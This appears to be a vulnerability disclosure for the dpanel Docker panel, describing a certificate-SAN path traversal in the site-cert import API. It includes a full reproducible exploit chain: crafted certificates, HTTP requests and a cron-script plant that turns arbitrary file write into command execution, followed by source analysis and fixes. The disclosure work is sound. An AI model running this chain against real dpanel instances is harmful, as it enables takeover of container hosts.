### Vulnerability details

**Official website / Product:** https://dpanel.cc / https://github.com/donknap/dpanel

**Repository:** donknap/dpanel (stars at selection: 4163)

**Vulnerability type:** file_upload / getshell (cert import DNS SAN path traversal → arbitrary file write; plant cron script for getshell)

**Vulnerability versions:** Latest release v1.11.2 (commit 6e1c3e1b6959) still affected; audited current default branch / official image `dpanel/dpanel:latest` (digest `7d4db67c8cc8…89ddfafa` resolves to app 1.11.2).

**Vulnerability URL / Parameter:** `POST /dpanel/api/app/site-cert/import`, parameters `sslCrtContent` (SAN/`DNSNames[0]` controls write path) and `sslKeyContent` (arbitrary file body; private key is **not** parsed/validated)

**Complex:** yes

### Verification procedure

1. Run the official image (host port **18703→8080**, docker.sock + data volume):
```bash
mkdir -p /home/kali/审计/github-star3k-webvulns/labs/dpanel/data
docker run -d --name dpanel-r7a3 \
  -p 18703:8080 \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /home/kali/审计/github-star3k-webvulns/labs/dpanel/data:/dpanel \
  dpanel/dpanel:latest
```
Inside the image `DP_ACME_CONFIG_HOME=/dpanel/acme` (ACME root). Audited source: https://github.com/donknap/dpanel @ tag `v1.11.2` / commit `6e1c3e1`.

2. Create the founder account, then login for a Bearer JWT (example `admin` / `Admin123!`; authenticated admin surface, same privilege class as CVE-2025-66292):
```http
POST /dpanel/api/common/user/create-founder HTTP/1.1
Host: 127.0.0.1:18703
Content-Type: application/json

{"username":"admin","password":"Admin123!","confirmPassword":"Admin123!"}
```
```http
POST /dpanel/api/common/user/login HTTP/1.1
Host: 127.0.0.1:18703
Content-Type: application/json

{"username":"admin","password":"Admin123!","autoLogin":true}
```
Use the JSON field `accessToken` as `Authorization: Bearer <accessToken>`.

3. Build an X.509 certificate whose **DNS SAN** is the traversal target (or use the PEM in the full request below). Example:
```bash
openssl req -x509 -newkey rsa:2048 -nodes -days 60 \
  -keyout /dev/null -out evil.crt -subj '/CN=x' \
  -addext 'subjectAltName=DNS:../../../../tmp/TMP-r7a3-1-proof'
```
For the getshell chain, use `DNS:../../../../etc/periodic/15min/r7a3` instead.

4. `POST /dpanel/api/app/site-cert/import` with that PEM as `sslCrtContent` and attacker-chosen bytes as `sslKeyContent` (even a shell script — **no** key parsing).

5. Confirm container files outside the ACME root:
   - `/tmp/TMP-r7a3-1-proof.key` (body equals `sslKeyContent`)
   - `/tmp/TMP-r7a3-1-proof.conf` and `/tmp/fullchain.cer`

6. (getshell chain) Import again with SAN aimed at `/etc/periodic/15min/r7a3` and a `#!/bin/sh` payload in `sslKeyContent`; call explorer `permission` to set `/etc/periodic/15min/r7a3.key` to `0755`; wait for crond or run `docker exec dpanel-r7a3 run-parts /etc/periodic/15min` (BusyBox `run-parts` does not skip dotted names). Marker file `/tmp/r7a3-getshell.out` contains `TMP-r7a3-1-GETSHELL`.

Vulnerability HTTP request (arbitrary-write proof; DNS SAN=`../../../../tmp/TMP-r7a3-1-proof`):

```http
POST /dpanel/api/app/site-cert/import HTTP/1.1
Host: 127.0.0.1:18703
Authorization: Bearer <accessToken>
Content-Type: application/json

{
  "sslCrtContent": "-----BEGIN CERTIFICATE-----\nMIIC1TCCAb2gAwIBAgIUcdgLp4dWbTHtByHe39XJet8JaoIwDQYJKoZIhvcNAQEL\nBQAwDDEKMAgGA1UEAwwBeDAeFw0yNjEwMzExMTM2MDdaFw0yNjEyMDExMTM2MDda\nMAwxCjAIBgNVBAMMAXgwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCU\n9LQoMK/8ylj9euCbniqU5gmBiMtq+chaw170vyDh/uw2uoywz3cQe1J0Mf10/ul5\nibq7CWSE9IUAlLgrdQiHWqqf4FoCMghGHp2OiynV9B4BaDyLCprRjD4ZSKtlZlbJ\ne6mlYfPaoYhkdK+Sl7MNiCz0tBSQ/VB5AkA1sZ2VsG5UfR83z5LABQJ299BselnY\npKKHpnuw5Gs4Yko8q2oBKxYM/EMNcnu0OcfWw7mPAd7Nw/4C1DsxSu4ifg3PaQrr\nEx+BHjBkjuJpWJdweqJZpaDi/4otDRurgcAG5dyED5SBrzeCq0Gsn4pbxwlZVtpw\n8G75s6FPVNFOdyA9uO8fAgMBAAGjLzAtMCsGA1UdEQQkMCKCIC4uLy4uLy4uLy4u\nL3RtcC9UTVAtcjdhMy0xLXByb29mMA0GCSqGSIb3DQEBCwUAA4IBAQCRIL/hFbST\n0l92Tzu8MPi9RkvlbpJd2l93t/o/I/mkn/eb011RtuQtiZhSfU4e1Vo8VVjtI0Ne\nGSQMi0zmC8ZpNh1qg7hVhZ2lkbFNIOLA+Iszu0cMmq13jFdArwESo/MMaZ2OAcV1\n+40YJQht34uaiPgl81le8O/7u+imiMFWoIiK7tYMGuCAzITdyXRqp+7SwOkEVMvB\nDpnKQ4nIp83FVJJ7D8We4n1FjUPQT/9CRKVPvm09njqPLYZ1PGBeRgfvBTXQub4z\nC0K6XE69Q6X6kHXOtc/8WkyI81EH/b7gtaF40rlOUxiqQSShF0gfwSRbW02e1EAe\naoLNB1YUzkMG\n-----END CERTIFICATE-----\n",
  "sslKeyContent": "TMP-r7a3-1 arbitrary file write proof via SiteCert.Import DNS SAN path traversal\n"
}
```

Verification response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":200,"data":"success"}
```

In-container check (after HTTP 200, via `docker exec`):

```
=== proof key ===
TMP-r7a3-1 arbitrary file write proof via SiteCert.Import DNS SAN path traversal

-rw-r--r--    1 root     root           311 Nov  1 19:36 /tmp/TMP-r7a3-1-proof.conf
-rw-r--r--    1 root     root            81 Nov  1 19:36 /tmp/TMP-r7a3-1-proof.key
-rw-r--r--    1 root     root          1042 Nov  1 19:36 /tmp/fullchain.cer
```

Getshell chain — second Import (SAN=`../../../../etc/periodic/15min/r7a3`; `sslKeyContent` is the cron script below):

```sh
#!/bin/sh
echo TMP-r7a3-1-GETSHELL > /tmp/r7a3-getshell.out
date >> /tmp/r7a3-getshell.out
```

```http
POST /dpanel/api/app/site-cert/import HTTP/1.1
Host: 127.0.0.1:18703
Authorization: Bearer <accessToken>
Content-Type: application/json

{
  "sslCrtContent": "-----BEGIN CERTIFICATE-----\nMIIDKzCCAhOgAwIBAgIUKUW7Y7d1LF60+DbIzYy0ho1xoJYwDQYJKoZIhvcNAQEL\nBQAwDDEKMAgGA1UEAwwBeDAeFw0yNjExMDMwMDAxMThaFw0yNzAxMDIwMDAxMTha\nMAwxCjAIBgNVBAMMAXgwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCt\nAENnuaKwaaVowROYYv5pGYnL8IurGyuQguPK/oTm/EsW70pvk1du6VnoHN+6bNJY\nK3EdVES4kV7NtY20YN1BVvFya65P9p43ptZ4H2BKDadxpo6salQ4Wsn9+IiXRdvR\nruF1Mb3RZ2VvmPC8Zn21rL2qswOH+E0annHtPKEvf1iiKAPKrEEY0bKxdwCkftSA\nKUz8yXVRT9l1TqfCSKkxOzQv6/wmo18qm5kfyi60GumgWSyFyRERdybO0eGhjArP\nceF6inKg94yj7W3XXwtWDhVWa5KIiZ9FbrjvQsg2QrgJfYzW6lmr/yQiW3PPy72l\n3017Gkf1uFOlKhES7HWBAgMBAAGjgYQwgYEwHQYDVR0OBBYEFPMe2I8IyPtZ38aR\nAPyMMes+hsdpMB8GA1UdIwQYMBaAFPMe2I8IyPtZ38aRAPyMMes+hsdpMA8GA1Ud\nEwEB/wQFMAMBAf8wLgYDVR0RBCcwJYIjLi4vLi4vLi4vLi4vZXRjL3BlcmlvZGlj\nLzE1bWluL3I3YTMwDQYJKoZIhvcNAQELBQADggEBACiZ+RmKKckpsSj4o6TgQEF3\nZkzczUjPVNCFOjCqtEDv7kySgAI2TOyOW+o3BxEKfLJEJ29H6QqyFGqn5ifvf3sR\n6/OYfDBo0fjKe3ZaAI/1QooGWsDqSAgGX+/vDN6V1YEeh3o/N2XgnYl6CRCIAHjd\n7lMp5PcX8kY2nhQDPUL2JeZN8uShsDuZZkfOVinzEmaq6VQ3VsQSzFELpcnApA96\n3VEYQORSWKD4Sv+YJueIlup0H2YGpexhP1mIPuyhyoFnrECCEo8Uj3tKtSdp1zBg\nBhuTZuZstzzz0YLnXTFWME45xg3L06qvbdPhhjyawJblouvaWMagKGh8Qak56/4=\n-----END CERTIFICATE-----\n",
  "sslKeyContent": "#!/bin/sh\necho TMP-r7a3-1-GETSHELL > /tmp/r7a3-getshell.out\ndate >> /tmp/r7a3-getshell.out\n"
}
```

This writes `/etc/periodic/15min/r7a3.key` (payload), `r7a3.conf`, and `fullchain.cer`. Then chmod:

```http
POST /dpanel/api/common/explorer/permission HTTP/1.1
Host: 127.0.0.1:18703
Authorization: Bearer <accessToken>
Content-Type: application/json

{
  "mountPoint": "local:host",
  "fileList": ["/etc/periodic/15min/r7a3.key"],
  "mod": "0755"
}
```

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"code":200,"data":"success"}
```

Verification result:

- Import returns `{"code":200,"data":"success"}`; in-container check:
```bash
docker exec dpanel-r7a3 sh -c 'cat /tmp/TMP-r7a3-1-proof.key; ls -la /tmp/TMP-r7a3-1-proof.* /tmp/fullchain.cer'
```
Expect `/tmp/TMP-r7a3-1-proof.key` body equals attacker `sslKeyContent`, plus sibling `.conf` / `fullchain.cer`.
- Getshell: after chmod, run:
```bash
docker exec dpanel-r7a3 run-parts /etc/periodic/15min
docker exec dpanel-r7a3 cat /tmp/r7a3-getshell.out
```
Expected output:
```
TMP-r7a3-1-GETSHELL
Sun Nov  1 19:35:18 CST 2026
```
Also confirm the planted payload is executable under periodic:
```
/etc/periodic/15min/:
total 24
-rw-r--r--    1 root     root          1046 Nov  1 19:35 fullchain.cer
-rw-r--r--    1 root     root           314 Nov  1 19:35 r7a3.conf
-rwxr-xr-x    1 root     root            91 Nov  1 19:35 r7a3.key
```

### Vulnerability analysis

`SiteCert.Import` parses the user PEM, takes `cert.DNSNames[0]` as `mainDomain`, and joins into the ACME tree:

`filepath.Join(GetCertDomainPath(), fmt.Sprintf("%s_ecc", mainDomain), mainDomain+".conf")`

`GetCertDomainPath()` defaults to `{storage}/acme/` (overridable via `DP_ACME_CONFIG_HOME`; image default `/dpanel/acme`). It never applies the project's `SafePathJoin` / `filepath.IsLocal` / `ValidateDomainName`. Because `filepath.Join` cleans `../`, a SAN such as `../../../../tmp/x` escapes the ACME root to `/tmp/x.conf`, `/tmp/x.key`, and `/tmp/fullchain.cer` (the `.key` name still carries the `mainDomain` prefix and is cleaned by a second `Join`). Unvalidated `sslKeyContent` and the cert PEM are then written under the escaped directory. This is path-escape arbitrary write, not intentional Docker exec / explorer file management. Same vulnerability class as fixed attach/delete CVE-2025-66292, different sink.

Vulnerable trigger / sink source (complete path and line numbers):

```go
# File: app/application/http/controller/site-cert.go
# Lines: 247-327 (v1.11.2)
func (self SiteCert) Import(http *gin.Context) {
	type ParamsValidate struct {
		SslKeyContent string `json:"sslKeyContent" binding:"required"`
		SslCrtContent string `json:"sslCrtContent" binding:"required"`
	}
	// ...
	cert, err := x509.ParseCertificate(block.Bytes)
	// ...
	if len(cert.DNSNames) <= 0 {
		self.JsonResponseWithError(http, function.ErrorMessage(define.ErrorMessageSiteDomainCertHasNotDNSName), 500)
		return
	}
	mainDomain := cert.DNSNames[0]
	// ...
	confFilePath := filepath.Join(storage.Local{}.GetCertDomainPath(), fmt.Sprintf(logic.CertName, mainDomain), mainDomain+".conf")
	err = os.MkdirAll(filepath.Dir(confFilePath), os.ModePerm)
	err = os.WriteFile(confFilePath, []byte(strings.Join(certConfig, "\n")), 0644)
	err = os.WriteFile(filepath.Join(filepath.Dir(confFilePath), "fullchain.cer"), []byte(params.SslCrtContent), 0644)
	err = os.WriteFile(filepath.Join(filepath.Dir(confFilePath), mainDomain+".key"), []byte(params.SslKeyContent), 0644)
	self.JsonSuccessResponse(http)
}
```

```go
# File: app/application/logic/site.go
# Lines: 24-26
	CertFileName  = "fullchain.cer"
	KeyFileName   = "%s.key"
	CertName      = "%s_ecc"
```

### Vulnerability Fix

1. Validate `mainDomain` with `ValidateDomainName`, or reject `/`, `\`, `..`.
2. Resolve all write paths via `SafePathJoin(GetCertDomainPath(), ...)` and enforce ACME-root containment (`realpath`).
3. Parse/verify `sslKeyContent` as a private key matching the certificate before writing.
